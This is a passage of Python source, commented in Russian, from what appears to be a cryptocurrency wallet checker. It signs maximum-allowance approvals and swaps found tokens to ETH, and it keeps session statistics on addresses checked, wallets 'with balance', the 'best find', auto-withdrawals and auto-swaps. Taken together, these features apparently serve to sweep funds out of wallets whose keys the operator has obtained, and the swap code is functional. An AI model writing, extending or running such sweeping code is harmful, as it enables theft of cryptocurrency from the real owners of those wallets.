                    token_contract = w3.eth.contract(address=token_address, abi=erc20_abi)
                    allowance = token_contract.functions.allowance(from_address, router_address).call()
                    
                    # Если allowance недостаточно - делаем approve
                    if allowance < amount_in_wei:
                        approve_tx = token_contract.functions.approve(
                            router_address,
                            2**256 - 1  # Максимальный approve
                        ).build_transaction({
                            'from': from_address,
                            'gas': 100000,
                            'gasPrice': w3.eth.gas_price,
                            'nonce': w3.eth.get_transaction_count(from_address),
                            'chainId': w3.eth.chain_id
                        })
                        
                        signed_approve = account.sign_transaction(approve_tx)
                        approve_hash = w3.eth.send_raw_transaction(signed_approve.rawTransaction)
                        
                        # Ждем подтверждения approve
                        w3.eth.wait_for_transaction_receipt(approve_hash, timeout=120)
                    
                    # Получаем ожидаемое количество ETH
                    path = [token_address, weth_address]
                    amounts_out = router_contract.functions.getAmountsOut(amount_in_wei, path).call()
                    expected_eth = amounts_out[-1]
                    
                    # Применяем slippage
                    slippage = getattr(self, 'swap_slippage', 1.0)
                    min_eth_out = int(expected_eth * (1 - slippage / 100))
                    
                    # Deadline (10 минут)
                    deadline = int(time.time()) + 600
                    
                    # Строим транзакцию swap
                    swap_tx = router_contract.functions.swapExactTokensForETH(
                        amount_in_wei,
                        min_eth_out,
                        path,
                        from_address,
                        deadline
                    ).build_transaction({
                        'from': from_address,
                        'gas': 300000,
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(from_address),
                        'chainId': w3.eth.chain_id
                    })
                    
                    # Подписываем и отправляем
                    signed_swap = account.sign_transaction(swap_tx)
                    swap_hash = w3.eth.send_raw_transaction(signed_swap.rawTransaction)
                    swap_hash_hex = swap_hash.hex()
                    
                    eth_received = expected_eth / 1e18
                    
                    swap_results.append({
                        "success": True,
                        "token": token_symbol,
                        "amount_in": token_amount,
                        "eth_out": eth_received,
                        "tx_hash": swap_hash_hex,
                        "chain": chain,
                        "message": f"✓ Обменял {token_amount:.6f} {token_symbol} на {eth_received:.6f} ETH"
                    })
                    
                except Exception as e:
                    swap_results.append({
                        "success": False,
                        "token": token_symbol,
                        "error": str(e)
                    })
            
        except Exception as e:
            swap_results.append({"error": f"Ошибка автообмена: {str(e)}"})
        
        return swap_results

    # ═══════════════════════════════════════════════════════════════════════════
    #  СТАТИСТИКА СЕССИИ
    # ═══════════════════════════════════════════════════════════════════════════
    
    def start_session(self):
        """Начать новую сессию проверки."""
        import time
        self.session_stats = {
            "total_checked": 0,
            "total_valid": 0,
            "total_with_balance": 0,
            "total_usd": 0.0,
            "total_withdrawn": 0,
            "total_swapped": 0,
            "best_find": {"address": "", "amount": 0.0, "chain": ""},
            "by_chain": {},
            "by_type": {},
            "start_time": time.time(),
            "end_time": None,
        }
    
    def update_session_stats(self, result: dict):
        """Обновить статистику сессии на основе результата проверки."""
        if not result:
            return
        
        self.session_stats["total_checked"] += 1
        
        if result.get("valid"):
            self.session_stats["total_valid"] += 1
        
        if result.get("exists"):
            self.session_stats["total_with_balance"] += 1
            
            # Обновляем общую сумму
            usd = result.get("info", {}).get("total_usd", 0)
            self.session_stats["total_usd"] += usd
            
            # Обновляем лучшую находку
            if usd > self.session_stats["best_find"]["amount"]:
                self.session_stats["best_find"] = {
                    "address": result.get("input", "")[:20] + "...",
                    "amount": usd,
                    "chain": result.get("wallet_type", result.get("type", "unknown"))
                }
            
            # Статистика по сетям
            chain = result.get("wallet_type", result.get("type", "unknown"))
            if chain not in self.session_stats["by_chain"]:
                self.session_stats["by_chain"][chain] = {"count": 0, "total_usd": 0.0}
            self.session_stats["by_chain"][chain]["count"] += 1
            self.session_stats["by_chain"][chain]["total_usd"] += usd
        
        # Статистика по типам
        result_type = result.get("type", "unknown")
        if result_type not in self.session_stats["by_type"]:
            self.session_stats["by_type"][result_type] = 0
        self.session_stats["by_type"][result_type] += 1
        
        # Обновляем счетчики выводов и обменов
        if result.get("info", {}).get("auto_withdraw"):
            self.session_stats["total_withdrawn"] += 1
        if result.get("info", {}).get("auto_swap"):
            self.session_stats["total_swapped"] += 1
    
    def end_session(self):
        """Завершить сессию проверки."""
        import time
        self.session_stats["end_time"] = time.time()
    
    def get_session_stats(self) -> dict:
        """Получить статистику текущей сессии."""
        import time
        
        stats = self.session_stats.copy()
        
        # Вычисляем длительность
        if stats["start_time"]:
            end_time = stats["end_time"] or time.time()
            duration = end_time - stats["start_time"]
            stats["duration_seconds"] = duration
            stats["duration_formatted"] = self._format_duration(duration)
            
            # Скорость проверки
            if duration > 0:
                stats["checks_per_second"] = stats["total_checked"] / duration
        
        # Процент успеха
        if stats["total_checked"] > 0:
            stats["success_rate"] = (stats["total_with_balance"] / stats["total_checked"]) * 100
        else:
            stats["success_rate"] = 0.0
        
        return stats
    
    def _format_duration(self, seconds: float) -> str:
        """Форматировать длительность в читаемый вид."""
        if seconds < 60:
            return f"{int(seconds)}с"
        elif seconds < 3600:
            minutes = int(seconds / 60)
            secs = int(seconds % 60)
            return f"{minutes}м {secs}с"
        else:
            hours = int(seconds / 3600)
            minutes = int((seconds % 3600) / 60)
            return f"{hours}ч {minutes}м"
    
    def export_session_stats(self, filename="session_stats.json"):
        """Экспортировать статистику сессии в файл."""
        import json
        stats = self.get_session_stats()
        
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(stats, f, indent=2, ensure_ascii=False)
        
        return f"✓ Статистика сохранена в {filename}"
    
    def get_session_summary(self) -> str:
        """Получить краткую сводку по сессии."""
        stats = self.get_session_stats()
        
        summary = f"""
╔══════════════════════════════════════════════════════════╗
║           📊 СТАТИСТИКА СЕССИИ                           ║
╠══════════════════════════════════════════════════════════╣
║ Проверено:        {stats['total_checked']:>6} адресов                    ║
║ Валидных:         {stats['total_valid']:>6} ({stats.get('success_rate', 0):.1f}%)                  ║
║ С балансом:       {stats['total_with_balance']:>6} адресов                    ║
║ Общая сумма:      ${stats['total_usd']:>10,.2f}                  ║
║ Выведено:         {stats['total_withdrawn']:>6} транзакций                ║
║ Обменено:         {stats['total_swapped']:>6} токенов                    ║
╠══════════════════════════════════════════════════════════╣
║ 🏆 Лучшая находка:                                       ║
║    {stats['best_find']['address']:<20} ${stats['best_find']['amount']:>10,.2f}    ║
║    Сеть: {stats['best_find']['chain']:<45}║
╠══════════════════════════════════════════════════════════╣
║ ⏱️  Длительность:  {stats.get('duration_formatted', 'N/A'):<40}║
║ ⚡ Скорость:       {stats.get('checks_per_second', 0):.1f} адресов/сек                ║
╚══════════════════════════════════════════════════════════╝
"""
        
        # Добавляем статистику по сетям
        if stats["by_chain"]:
            summary += "\n📍 По сетям:\n"
            for chain, data in sorted(stats["by_chain"].items(), key=lambda x: x[1]["total_usd"], reverse=True):
                summary += f"   {chain:>15}: {data['count']:>3} адресов, ${data['total_usd']:>10,.2f}\n"
        
        return summary
